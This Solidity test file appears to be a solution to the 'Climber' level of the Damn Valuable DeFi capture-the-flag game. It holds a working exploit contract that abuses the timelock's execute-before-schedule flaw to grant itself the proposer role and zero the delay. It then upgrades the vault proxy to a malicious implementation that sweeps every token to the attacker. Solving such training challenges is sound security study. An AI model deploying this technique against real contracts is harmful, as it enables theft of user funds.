// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "openzeppelin-contracts/proxy/ERC1967/ERC1967Proxy.sol";
import "forge-std/Test.sol";

import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
import {ClimberTimelock} from "../../../src/Contracts/climber/ClimberTimelock.sol";
import {ClimberVault} from "../../../src/Contracts/climber/ClimberVault.sol";
import {UUPSUpgradeable} from "openzeppelin-contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";

contract Climber is Test {
    uint256 internal constant VAULT_TOKEN_BALANCE = 10_000_000e18;

    Utilities internal utils;
    DamnValuableToken internal dvt;
    ClimberTimelock internal climberTimelock;
    ClimberVault internal climberImplementation;
    ERC1967Proxy internal climberVaultProxy;
    address[] internal users;
    address payable internal deployer;
    address payable internal proposer;
    address payable internal sweeper;
    address payable internal attacker;

    function setUp() public {
        /**
         * SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE
         */

        utils = new Utilities();
        users = utils.createUsers(3);

        deployer = payable(users[0]);
        proposer = payable(users[1]);
        sweeper = payable(users[2]);

        attacker = payable(address(uint160(uint256(keccak256(abi.encodePacked("attacker"))))));
        vm.label(attacker, "Attacker");
        vm.deal(attacker, 0.1 ether);

        // Deploy the vault behind a proxy using the UUPS pattern,
        // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
        climberImplementation = new ClimberVault();
        vm.label(address(climberImplementation), "climber Implementation");

        bytes memory data = abi.encodeWithSignature("initialize(address,address,address)", deployer, proposer, sweeper);
        climberVaultProxy = new ERC1967Proxy(
            address(climberImplementation),
            data
        );

        assertEq(ClimberVault(address(climberVaultProxy)).getSweeper(), sweeper);

        assertGt(ClimberVault(address(climberVaultProxy)).getLastWithdrawalTimestamp(), 0);

        climberTimelock = ClimberTimelock(payable(ClimberVault(address(climberVaultProxy)).owner()));

        assertTrue(climberTimelock.hasRole(climberTimelock.PROPOSER_ROLE(), proposer));

        assertTrue(climberTimelock.hasRole(climberTimelock.ADMIN_ROLE(), deployer));

        // Deploy token and transfer initial token balance to the vault
        dvt = new DamnValuableToken();
        vm.label(address(dvt), "DVT");
        dvt.transfer(address(climberVaultProxy), VAULT_TOKEN_BALANCE);

        console.log(unicode"🧨 Let's see if you can break it... 🧨");
    }

    function testExploit() public {
        vm.startPrank(attacker);
        Exploiter exploiter = new Exploiter(dvt, climberTimelock, climberImplementation, climberVaultProxy);
        vm.label(address(exploiter), "Exploiter contract");
        exploiter.exploit();
        vm.stopPrank();
        validation();
        console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
    }

    function validation() internal {
        /**
         * SUCCESS CONDITIONS
         */
        assertEq(dvt.balanceOf(attacker), VAULT_TOKEN_BALANCE);
        assertEq(dvt.balanceOf(address(climberVaultProxy)), 0);
    }
}

contract Exploiter {
    address[] targets = new address[](5);
    uint256[] values = new uint256[](5);
    bytes[] dataElements = new bytes[](5);

    DamnValuableToken internal immutable dvt;
    ClimberTimelock internal immutable climberTimelock;
    ClimberVault internal immutable climberImplementation;
    ERC1967Proxy internal immutable climberVaultProxy;
    address internal immutable owner;
    bytes32 public constant PROPOSER_ROLE = keccak256("PROPOSER_ROLE");

    modifier onlyOwner() {
        require(msg.sender == owner, "only owner"); // Modifier to avoid getting front-run by searchers
        _;
    }

    constructor(
        DamnValuableToken _dvt,
        ClimberTimelock _climberTimelock,
        ClimberVault _climberImplementation,
        ERC1967Proxy _climberVaultProxy
    ) {
        dvt = _dvt;
        climberTimelock = _climberTimelock;
        climberImplementation = _climberImplementation;
        climberVaultProxy = _climberVaultProxy;
        owner = msg.sender;
    }

    function exploit() external onlyOwner {
        NewImplementation newImplementation = new NewImplementation(dvt, owner, climberTimelock);

        targets[0] = address(climberTimelock);
        targets[1] = address(climberTimelock);
        targets[2] = address(climberVaultProxy);
        targets[3] = address(climberVaultProxy);
        targets[4] = address(this);

        values[0] = 0;
        values[1] = 0;
        values[2] = 0;
        values[3] = 0;
        values[4] = 0;

        dataElements[0] = abi.encodeWithSignature("updateDelay(uint64)", 0);
        dataElements[1] = abi.encodeWithSignature("grantRole(bytes32,address)", PROPOSER_ROLE, address(this));
        dataElements[2] = abi.encodeWithSignature("upgradeTo(address)", address(newImplementation));
        dataElements[3] = abi.encodeWithSignature("transferTokens()");
        dataElements[4] = abi.encodeWithSignature("schedule()");

        climberTimelock.execute(targets, values, dataElements, keccak256("salt"));
    }

    function schedule() external {
        climberTimelock.schedule(targets, values, dataElements, keccak256("salt"));
    }
}

contract NewImplementation is UUPSUpgradeable {
    DamnValuableToken internal immutable dvt;
    address internal immutable attacker;
    ClimberTimelock internal immutable climberTimelock;

    constructor(DamnValuableToken _dvt, address _attacker, ClimberTimelock _climberTimelock) {
        dvt = _dvt;
        attacker = _attacker;
        climberTimelock = _climberTimelock;
    }

    function transferTokens() external {
        dvt.transfer(attacker, dvt.balanceOf(address(this)));
        console.log("attacker balance: %s", dvt.balanceOf(attacker));
        console.log("Vault balance: %s", dvt.balanceOf(address(this)));
    }

    function _authorizeUpgrade(address newImplementation) internal override {}
}
